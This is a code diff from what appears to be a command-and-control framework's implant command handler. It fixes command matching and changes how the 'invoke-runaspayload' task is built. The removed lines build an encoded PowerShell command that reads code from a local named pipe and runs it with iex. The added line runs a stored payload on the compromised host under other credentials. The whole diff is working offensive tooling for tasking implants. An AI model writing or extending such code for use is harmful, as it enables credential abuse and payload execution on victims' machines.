@@ -89,11 +89,11 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command.startswith("invoke-dcompayload "):
         do_invoke_dcompayload(user, command, randomuri)
         return
-    elif command.startswith("invoke-runas "):
-        do_invoke_runas(user, command, randomuri)
-        return
     elif command.startswith("invoke-runaspayload"):
         do_invoke_runaspayload(user, command, randomuri)
+        return
+    elif command.startswith("invoke-runas "):
+        do_invoke_runas(user, command, randomuri)
         return
     elif command == "help":
         do_help(user, command, randomuri)
@@ -417,11 +417,9 @@ def do_invoke_runaspayload(user, command, randomuri):
             payload = p.read()
         new_task("$proxypayload = \"%s\"" % payload, user, randomuri)
         check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
-        check_module_loaded("NamedPipeDaisy.ps1", randomuri, user)
-        params = re.compile("invoke-runasdaisypayload ", re.IGNORECASE)
+        params = re.compile("invoke-runaspayload ", re.IGNORECASE)
         params = params.sub("", command)
-        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
-        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
+        pscommand = f"invoke-runas {params} -command $proxypayload"
         new_task(pscommand, user, randomuri)
     else:
         print("Need to run createnewpayload first")
